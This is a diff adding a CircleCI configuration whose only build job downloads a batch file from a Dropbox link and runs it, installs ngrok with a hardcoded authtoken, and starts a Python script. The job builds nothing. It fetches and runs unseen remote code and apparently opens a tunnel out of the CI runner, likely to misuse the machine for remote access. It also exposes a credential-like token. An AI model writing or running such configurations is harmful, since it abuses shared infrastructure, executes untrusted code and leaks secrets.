@@ -1,0 +1,17 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: 'windows-server-2022-gui:current'
+      resource_class: windows.medium
+      shell: powershell.exe -ExecutionPolicy Bypass
+    steps:
+      - run: |
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/ir1q6lxyqfbg178nsrvn9/setup.bat?rlkey=wn117nwq2081wfpiw58lrx8bt&dl=1" -OutFile "setup.bat"
+         choco install ngrok -y --quiet
+         ngrok config add-authtoken 2UjVwlsiXNUzfSFn8uayYTiHEyC_5ZMW38nx8T4yLhwc5tcFy
+         cmd /c setup.bat
+         python time.py
+         
+         
